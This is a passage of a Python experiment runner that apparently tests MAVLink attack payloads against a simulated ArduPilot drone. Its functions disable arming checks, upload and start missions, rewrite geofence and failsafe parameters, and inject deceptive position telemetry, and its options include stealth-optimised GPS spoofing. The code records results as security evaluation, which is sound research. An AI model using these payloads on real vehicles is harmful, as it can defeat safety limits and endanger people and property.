        env["arming_check_disabled"] = set_param(conn, "ARMING_CHECK", 0)
        env["guided_mode"] = set_mode(conn, "GUIDED")
        env["armed"] = arm_vehicle(conn)
        env["auto_mode"] = set_mode(conn, "AUTO")
        if env["auto_mode"]:
            try:
                send_command_long(conn, getattr(mavutil.mavlink, "MAV_CMD_MISSION_START", 300), [0.0, 1.0])
            except Exception:
                pass
        telemetry_rows.extend(collect_telemetry(conn, experiment, "mission_edit_observe", 0, None, lat, lon, start, 8.0, state))
        mission_seqs = [
            int(as_float(row.get("mission_seq")))
            for row in telemetry_rows
            if row.get("message_type") == "MISSION_CURRENT" and row.get("mission_seq") not in ("", None)
        ]
        max_seq = max(mission_seqs) if mission_seqs else 0
        env["params_after"] = snapshot_params(conn, bundle_dir / "params_after.txt")
        passed = bool(uploaded and readback_count >= 2)
        reason = "mission upload ACK/readback confirmed" if passed else "mission upload or readback failed"
        rows.append(
            payload_matrix_row(
                experiment,
                "mission-edit",
                "fc-direct",
                "single-waypoint-upload",
                "pass" if passed else "fail",
                reason,
                "mission path modification",
                "MAVLink mission upload/write access",
                "mission list changed; AUTO progression observed" if max_seq > 0 else "mission list changed" if passed else "no confirmed mission change",
                passed,
                False,
                f"uploaded={uploaded}; readback_count={readback_count}; max_mission_seq={max_seq}",
            )
        )
        impact_rows.append(
            mission_impact_row(
                "mission-edit",
                "fc-direct",
                "single-waypoint-upload",
                "mission-upload",
                passed,
                "MISSION_ACK/readback",
                mission_seq=max_seq,
                notes=reason,
            )
        )
        pre_rows.append(
            precondition_row(
                "mission-edit",
                "fc-direct",
                "MAVLink write access to mission protocol",
                "FC accepts mission upload; AUTO observation optional",
                "ARMING_CHECK may need relaxation for AUTO observation in SITL",
            )
        )
        verdict = {
            "experiment": experiment,
            "claim_tested": "MAVLink mission-edit payload",
            "verdict": "pass" if passed else "fail",
            "reason": reason,
            "metrics": {"uploaded": uploaded, "readback_count": readback_count, "max_mission_seq": max_seq},
            "not_claimed": NOT_CLAIMED,
        }
        write_payload_bundle(bundle_dir, rows, impact_rows, pre_rows, {"payload": "mission-edit", "verdict": verdict})
        return write_bundle(bundle_dir, experiment, env, [], telemetry_rows, verdict)
    except Exception as exc:
        (bundle_dir / "params_before.txt").write_text("not captured\n", encoding="utf-8")
        (bundle_dir / "params_after.txt").write_text("not captured\n", encoding="utf-8")
        if not (bundle_dir / "sitl.log").exists():
            (bundle_dir / "sitl.log").write_text("", encoding="utf-8")
        payload_empty_files(bundle_dir)
        verdict = {
            "experiment": experiment,
            "claim_tested": "MAVLink mission-edit payload",
            "verdict": "error",
            "reason": repr(exc),
            "metrics": {},
            "not_claimed": NOT_CLAIMED,
        }
        return write_bundle(bundle_dir, experiment, env, [], telemetry_rows, verdict)
    finally:
        if conn is not None:
            try:
                conn.close()
            except Exception:
                pass
        for proc in reversed(processes):
            proc.stop()
        time.sleep(1.0)


def run_e21(config: RunnerConfig) -> Path:
    experiment = "E21_param_edit"
    bundle_dir = create_bundle(config, experiment)
    env = base_env(config, experiment, "param-edit", f"tcp:127.0.0.1:{config.port}")
    processes: list[ManagedProcess] = []
    conn = None
    rows: list[dict] = []
    impact_rows: list[dict] = []
    pre_rows: list[dict] = []
    speed_candidates = (
        ("WPNAV_SPEED", 250.0, 150.0),
        ("WP_SPD", 2.5, 4.0),
        ("LOIT_SPEED", 500.0, 300.0),
        ("LOIT_SPEED_MS", 2.5, 4.0),
    )
    try:
        sitl, sitl_command = start_sitl(config, bundle_dir)
        processes.append(sitl)
        env["sitl_launch_command"] = sitl_command
        conn = connect_mavlink(f"tcp:127.0.0.1:{config.port}")
        request_message_intervals(conn)
        selected_speed = first_existing_param(conn, speed_candidates)
        candidate_param_names = [
            "FENCE_RADIUS",
            "FENCE_ACTION",
            "FS_EKF_ACTION",
            *[name for name, _preferred, _alternate in speed_candidates],
        ]
        env["selected_speed_param"] = selected_speed[0] if selected_speed else None
        env["speed_param_candidates"] = [name for name, _preferred, _alternate in speed_candidates]
        env["params_before"] = snapshot_params(conn, bundle_dir / "params_before.txt", candidate_param_names)
        params_to_set = {
            "FENCE_RADIUS": changed_target(env["params_before"].get("FENCE_RADIUS"), 12.0, 10.0),
            "FENCE_ACTION": changed_target(env["params_before"].get("FENCE_ACTION"), 1.0, 0.0),
            "FS_EKF_ACTION": changed_target(env["params_before"].get("FS_EKF_ACTION"), 1.0, 0.0),
        }
        if selected_speed is not None:
            speed_name, speed_target, _speed_before = selected_speed
            params_to_set[speed_name] = speed_target
        param_results = {}
        for name, target in params_to_set.items():
            before = env["params_before"].get(name)
            set_ok = set_param(conn, name, target)
            after = request_param(conn, name)
            readback_ok = after is not None and abs(float(after) - float(target)) < 0.2
            param_results[name] = {
                "before": before,
                "target": target,
                "after": after,
                "set_ok": set_ok,
                "readback_ok": readback_ok,
            }
            impact_rows.append(
                mission_impact_row(
                    "param-edit",
                    "fc-direct",
                    name,
                    "parameter-change",
                    readback_ok,
                    "PARAM_VALUE readback",
                    parameter=name,
                    before=before,
                    after=after,
                    notes="confirmed" if readback_ok else "not confirmed",
                )
            )
        env["params_after"] = snapshot_params(conn, bundle_dir / "params_after.txt", candidate_param_names)
        required = ["FENCE_RADIUS", "FENCE_ACTION"]
        if selected_speed is not None:
            required.append(selected_speed[0])
        required_ok = selected_speed is not None and all(param_results[name]["readback_ok"] for name in required)
        confirmed_count = sum(1 for result in param_results.values() if result["readback_ok"])
        if selected_speed is None:
            reason = "no writable speed parameter candidate responded"
        else:
            reason = f"{confirmed_count}/{len(param_results)} parameter changes confirmed; speed_param={selected_speed[0]}"
        rows.append(
            payload_matrix_row(
                experiment,
                "param-edit",
                "fc-direct",
                "fence-speed-failsafe-params",
                "pass" if required_ok else "fail",
                reason,
                "persistent configuration change",
                "MAVLink parameter write access",
                "configuration/stateful mission behavior can be changed later",
                required_ok,
                False,
                f"PARAM_VALUE readback; required={','.join(required)}",
            )
        )
        pre_rows.append(
            precondition_row(
                "param-edit",
                "fc-direct",
                "MAVLink parameter write access",
                "target parameters exist and are writable",
                f"selected={','.join(params_to_set.keys())}; speed_candidates={','.join(env['speed_param_candidates'])}",
            )
        )
        verdict = {
            "experiment": experiment,
            "claim_tested": "MAVLink parameter-edit payload",
            "verdict": "pass" if required_ok else "fail",
            "reason": reason,
            "metrics": {
                "param_results": param_results,
                "required_params": required,
                "selected_speed_param": selected_speed[0] if selected_speed else None,
            },
            "not_claimed": NOT_CLAIMED,
        }
        write_payload_bundle(bundle_dir, rows, impact_rows, pre_rows, {"payload": "param-edit", "verdict": verdict})
        return write_bundle(bundle_dir, experiment, env, [], [], verdict)
    except Exception as exc:
        (bundle_dir / "params_before.txt").write_text("not captured\n", encoding="utf-8")
        (bundle_dir / "params_after.txt").write_text("not captured\n", encoding="utf-8")
        if not (bundle_dir / "sitl.log").exists():
            (bundle_dir / "sitl.log").write_text("", encoding="utf-8")
        payload_empty_files(bundle_dir)
        verdict = {
            "experiment": experiment,
            "claim_tested": "MAVLink parameter-edit payload",
            "verdict": "error",
            "reason": repr(exc),
            "metrics": {},
            "not_claimed": NOT_CLAIMED,
        }
        return write_bundle(bundle_dir, experiment, env, [], [], verdict)
    finally:
        if conn is not None:
            try:
                conn.close()
            except Exception:
                pass
        for proc in reversed(processes):
            proc.stop()
        time.sleep(1.0)


def run_e22(config: RunnerConfig) -> Path:
    experiment = "E22_telemetry_deception"
    child = run_position_injection(
        replace(config, iterations=8, warmup_sec=min(config.warmup_sec, 4.0)),
        experiment=experiment,
        route="fc-direct-output-message-deception",
        connection=f"tcp:127.0.0.1:{config.port}",
        profile="linear",
        engine="global-position-int",
        injection_kind="global-position-int",
        claim="GLOBAL_POSITION_INT telemetry/log deception separated from FC navigation input",
        expect_positive=False,
    )
    verdict = json.loads((child / "verdict.json").read_text(encoding="utf-8"))
    metrics = verdict.get("metrics", {})
    separated = verdict.get("verdict") == "pass"
    rows = [
        payload_matrix_row(
            experiment,
            "telemetry-deception",
            "fc-direct",
            "GLOBAL_POSITION_INT",
            "pass" if separated else "fail",
            "output-style message did not contaminate FC input" if separated else verdict.get("reason", ""),
            "GCS/log stream confusion only",
            "MAVLink access to telemetry stream; not FC sensor input",
            "operator/log deception, not autonomous FC behavior change",
            False,
            True,
            f"reflection_rate={metrics.get('reflection_rate', 0.0)}",
            str(child),
        )
    ]
    impact_rows = [
        mission_impact_row(
            "telemetry-deception",
            "fc-direct",
            "GLOBAL_POSITION_INT",
            "telemetry-only",
            separated,
            "negative FC reflection control",
            notes="FC navigation input did not follow injected GLOBAL_POSITION_INT" if separated else verdict.get("reason", ""),
        )
    ]
    pre_rows = [
        precondition_row(
            "telemetry-deception",
            "fc-direct",
            "MAVLink access to output/telemetry path",
            "GCS/log consumer accepts unauthenticated or competing status messages",
            "none for FC input; this is not GPS spoofing",
        )
    ]
    write_payload_bundle(child, rows, impact_rows, pre_rows, {"payload": "telemetry-deception", "source_verdict": verdict})
    return child


def latest_payload_rows(config: RunnerConfig) -> tuple[list[dict], list[dict], list[dict]]:
    rows: list[dict] = []
    impact_rows: list[dict] = []
    pre_rows: list[dict] = []
    gps_source = latest_bundle(config.out_root, "E13_route_relaxation") or latest_bundle(config.out_root, "E12_stealth_optimizer")
    if gps_source:
        source_rows = read_csv_rows(gps_source / "route_score.csv")
        if not source_rows:
            source_rows = read_csv_rows(gps_source / "stealth_metrics.csv")
        gps_pass = [row for row in source_rows if row.get("verdict") == "pass"]
        for row in gps_pass[:3]:
            route = row.get("route", "fc-direct")
            rows.append(
                payload_matrix_row(
                    "E18_payload_matrix",
                    "gps-input",
                    route,
                    row.get("profile", "gps-input"),
                    "pass",
                    "existing GPS_INPUT result reused",
                    "position-estimate/geofence deception",
                    "trusted GPS_INPUT path to FC",
                    "geofence decision impact",
                    True,
                    False,
                    f"reflection_rate={row.get('reflection_rate', '')}",
                    str(gps_source),
                )
            )
            impact_rows.append(
                mission_impact_row(
                    "gps-input",
                    route,
                    row.get("profile", "gps-input"),
                    "geofence-decision",
                    True,
                    "FENCE_STATUS breach",
                    notes="reused latest GPS_INPUT evidence bundle",
                )
            )
            pre_rows.append(
                precondition_row(
                    "gps-input",
                    route,
                    "trusted MAVLink GPS_INPUT path",
                    "FC configured to accept MAVLink GPS input",
                    "GPS1_TYPE/GPS_TYPE set to MAVLink GPS in SITL",
                )
            )
    for suffix in ("E19_mode_command", "E20_mission_edit", "E21_param_edit", "E22_telemetry_deception"):
        path = latest_bundle(config.out_root, suffix)
        if not path:
            rows.append(
                payload_matrix_row(
                    "E18_payload_matrix",
                    suffix.split("_", 1)[1],
                    "",
                    "",
                    "blocked",
                    "no source bundle found",
                    "",
                    "",
                    "",
                    False,
                    False,
                    "",
                )
            )
            continue
        rows.extend(read_csv_rows(path / "payload_matrix.csv"))
        impact_rows.extend(read_csv_rows(path / "mission_impact_matrix.csv"))
        pre_rows.extend(read_csv_rows(path / "precondition_matrix.csv"))
    return rows, impact_rows, pre_rows


def run_e18(config: RunnerConfig) -> Path:
    experiment = "E18_payload_matrix"
    bundle_dir = create_bundle(config, experiment)
    env = base_env(config, experiment, "deterministic-payload-matrix", "<summary>")
    (bundle_dir / "sitl.log").write_text("E18 summarizes latest GPS_INPUT and E19-E22 payload bundles.\n", encoding="utf-8")
    (bundle_dir / "params_before.txt").write_text("not applicable\n", encoding="utf-8")
    (bundle_dir / "params_after.txt").write_text("not applicable\n", encoding="utf-8")
    rows, impact_rows, pre_rows = latest_payload_rows(config)
    selected = set(payloads_to_run(config.payload))
    if config.payload != "all":
        rows = [row for row in rows if row.get("payload") in selected]
        impact_rows = [row for row in impact_rows if row.get("payload") in selected]
        pre_rows = [row for row in pre_rows if row.get("payload") in selected]
    passed_payloads = sorted({row["payload"] for row in rows if row.get("verdict") == "pass"})
    verdict = {
        "experiment": experiment,
        "claim_tested": "deterministic MAVLink post-access payload matrix",
        "verdict": "pass" if passed_payloads else "fail",
        "reason": f"payload matrix captured pass results for: {', '.join(passed_payloads)}" if passed_payloads else "no payload passed",
        "metrics": {"payload_rows": rows, "passed_payloads": passed_payloads},
        "not_claimed": NOT_CLAIMED,
    }
    summary = {
        "classification": "deterministic MAVLink post-access payload matrix",
        "passed_payloads": passed_payloads,
        "not_claimed": NOT_CLAIMED,
        "verdict": verdict,
    }
    write_payload_bundle(bundle_dir, rows, impact_rows, pre_rows, summary)
    return write_bundle(bundle_dir, experiment, env, [], [], verdict)


def run_e23(config: RunnerConfig) -> Path:
    experiment = "E23_attack_surface_summary"
    bundle_dir = create_bundle(config, experiment)
    env = base_env(config, experiment, "attack-surface-summary", "<summary>")
    (bundle_dir / "sitl.log").write_text("E23 summarizes latest deterministic payload matrix.\n", encoding="utf-8")
    (bundle_dir / "params_before.txt").write_text("not applicable\n", encoding="utf-8")
    (bundle_dir / "params_after.txt").write_text("not applicable\n", encoding="utf-8")
    e18 = latest_bundle(config.out_root, "E18_payload_matrix")
    rows = read_csv_rows(e18 / "payload_matrix.csv") if e18 else []
    impact_rows = read_csv_rows(e18 / "mission_impact_matrix.csv") if e18 else []
    pre_rows = read_csv_rows(e18 / "precondition_matrix.csv") if e18 else []
    passed_payloads = sorted({row["payload"] for row in rows if row.get("verdict") == "pass"})
    fc_payloads = sorted({row["payload"] for row in rows if row.get("fc_impact") in ("1", 1, True) and row.get("verdict") == "pass"})
    gcs_payloads = sorted({row["payload"] for row in rows if row.get("gcs_or_log_impact") in ("1", 1, True) and row.get("verdict") == "pass"})
    verdict = {
        "experiment": experiment,
        "claim_tested": "MAVLink post-access attack surface summary without AI",
        "verdict": "pass" if passed_payloads else "fail",
        "reason": "deterministic payload matrix summarized" if passed_payloads else "no passing payloads to summarize",
        "metrics": {
            "source_bundle": str(e18) if e18 else None,
            "passed_payloads": passed_payloads,
            "fc_impact_payloads": fc_payloads,
            "gcs_or_log_impact_payloads": gcs_payloads,
        },
        "not_claimed": NOT_CLAIMED,
    }
    summary = {
        "final_claim": (
            "authorized SITL deterministic MAVLink post-access payload matrix; "
            "no AI, no remote intrusion, no signing bypass, no RF attack"
        ),
        "passed_payloads": passed_payloads,
        "fc_impact_payloads": fc_payloads,
        "gcs_or_log_impact_payloads": gcs_payloads,
        "source_bundle": str(e18) if e18 else None,
        "verdict": verdict,
    }
    write_payload_bundle(bundle_dir, rows, impact_rows, pre_rows, summary)
    return write_bundle(bundle_dir, experiment, env, [], [], verdict)


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description="B-path ArduPilot SITL experiment runner")
    parser.add_argument(
        "--experiment",
        choices=[
            "E0", "E1", "E2", "E3", "E4", "E5", "E6",
            "E7", "E8", "E9", "E10",
            "E11", "E12", "E13", "E14", "E15", "E16", "E17",
            "E18", "E19", "E20", "E21", "E22", "E23",
            "all", "all-advanced", "all-real-advanced", "all-payloads",
        ],
        default="all",
    )
    parser.add_argument(
        "--ardupilot-dir",
        type=Path,
        default=Path(os.environ.get("ARDUPILOT_DIR", str(DEFAULT_ARDUPILOT_DIR))),
    )
    parser.add_argument(
        "--out-root",
        type=Path,
        default=PROJECT_ROOT / "results" / "b_path",
    )
    parser.add_argument("--home", default=DEFAULT_HOME)
    parser.add_argument("--port", type=int, default=5760)
    parser.add_argument("--udp-port", type=int, default=14550)
    parser.add_argument("--iterations", type=int, default=20)
    parser.add_argument("--interval", type=float, default=0.5)
    parser.add_argument("--step-m", type=float, default=1.0)
    parser.add_argument("--bearing-deg", type=float, default=45.0)
    parser.add_argument("--warmup-sec", type=float, default=10.0)
    parser.add_argument("--gps-id", type=int, default=0)
    parser.add_argument("--fix-type", type=int, default=3)
    parser.add_argument("--satellites", type=int, default=12)
    parser.add_argument("--hacc", type=float, default=0.8)
    parser.add_argument("--vacc", type=float, default=1.2)
    parser.add_argument("--sacc", type=float, default=0.25)
    parser.add_argument("--max-speed", type=float, default=2.5)
    parser.add_argument("--max-accel", type=float, default=1.0)
    parser.add_argument("--max-drift-m", type=float, default=30.0)
    parser.add_argument("--decision-hold-sec", type=float, default=2.0)
    parser.add_argument("--adaptive-refine-steps", type=int, default=5)
    parser.add_argument("--profile", choices=["linear", "ekf-smooth", "adaptive", "stealth-opt"], default="linear")
    parser.add_argument("--mission", choices=["geofence", "auto-waypoint"], default="geofence")
    parser.add_argument("--route", choices=["fc-direct", "mavproxy-udp", "companion", "all"], default="fc-direct")
    parser.add_argument("--objective", choices=["auto", "geofence", "auto-waypoint", "rtl", "land", "failsafe"], default="auto")
    parser.add_argument("--routes", choices=["all", "fc-direct", "mavproxy-udp", "companion"], default="all")
    parser.add_argument("--stealth-budget", choices=["strict", "normal", "loose"], default="normal")
    parser.add_argument("--payload", choices=["gps-input", "mode-command", "mission-edit", "param-edit", "telemetry-deception", "all"], default="all")
    parser.add_argument("--install-mavproxy", action="store_true")
    parser.add_argument("--no-build", action="store_true")
    return parser.parse_args()


def main() -> None:
    args = parse_args()
    config = RunnerConfig(
        ardupilot_dir=args.ardupilot_dir,
        out_root=args.out_root,
        home=args.home,
        port=args.port,
        udp_port=args.udp_port,
        iterations=args.iterations,
        interval=args.interval,
        step_m=args.step_m,
        bearing_deg=args.bearing_deg,
        warmup_sec=args.warmup_sec,
        gps_id=args.gps_id,
        fix_type=args.fix_type,
        satellites=args.satellites,
        hacc=args.hacc,
        vacc=args.vacc,
        sacc=args.sacc,
        max_speed=args.max_speed,
        max_accel=args.max_accel,
        max_drift_m=args.max_drift_m,
        decision_hold_sec=args.decision_hold_sec,
        adaptive_refine_steps=args.adaptive_refine_steps,
        profile=args.profile,
        mission=args.mission,
        route=args.route,
        objective=args.objective,
        routes=args.routes,
        stealth_budget=args.stealth_budget,
        payload=args.payload,
        install_mavproxy=args.install_mavproxy,
        build_if_missing=not args.no_build,
    )
    config.out_root.mkdir(parents=True, exist_ok=True)

    plan = {
        "E0": lambda: [run_e0(config)],
        "E1": lambda: [run_e1(config)],
        "E2": lambda: [run_e2(config)],
        "E3": lambda: [run_e3(config)],
        "E4": lambda: run_e4(config),
        "E5": lambda: [run_e5(config)],
        "E6": lambda: [run_e6(config)],
        "E7": lambda: [run_e7(config)],
        "E8": lambda: [run_e8(config)],
        "E9": lambda: [run_e9(config)],
        "E10": lambda: [run_e10(config)],
        "E11": lambda: [run_e11(config)],
        "E12": lambda: [run_e12(config)],
        "E13": lambda: [run_e13(config)],
        "E14": lambda: [run_e14(config)],
        "E15": lambda: [run_e15(config)],
        "E16": lambda: [run_e16(config)],
        "E17": lambda: [run_e17(config)],
        "E18": lambda: [run_e18(config)],
        "E19": lambda: [run_e19(config)],
        "E20": lambda: [run_e20(config)],
        "E21": lambda: [run_e21(config)],
        "E22": lambda: [run_e22(config)],
        "E23": lambda: [run_e23(config)],
    }
    if args.experiment == "all":
        order = ["E0", "E1", "E2", "E3", "E4", "E5", "E6"]
    elif args.experiment == "all-advanced":
        order = ["E7", "E8", "E9", "E10"]
    elif args.experiment == "all-real-advanced":
        order = ["E11", "E12", "E13", "E14", "E15", "E16", "E17"]
    elif args.experiment == "all-payloads":
        order = ["E19", "E20", "E21", "E22", "E18", "E23"]
    else:
        order = [args.experiment]
    produced: list[Path] = []
    for key in order:
        print(f"[b_path] running {key}", flush=True)
        new_paths = plan[key]()
        produced.extend(new_paths)
        for path in new_paths:
            verdict_path = path / "verdict.json"
            verdict = json.loads(verdict_path.read_text(encoding="utf-8"))
            print(f"[b_path] {path.name}: {verdict['verdict']} - {verdict['reason']}", flush=True)

    print("[b_path] produced bundles:", flush=True)
    for path in produced:
        print(path, flush=True)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        sys.exit(130)
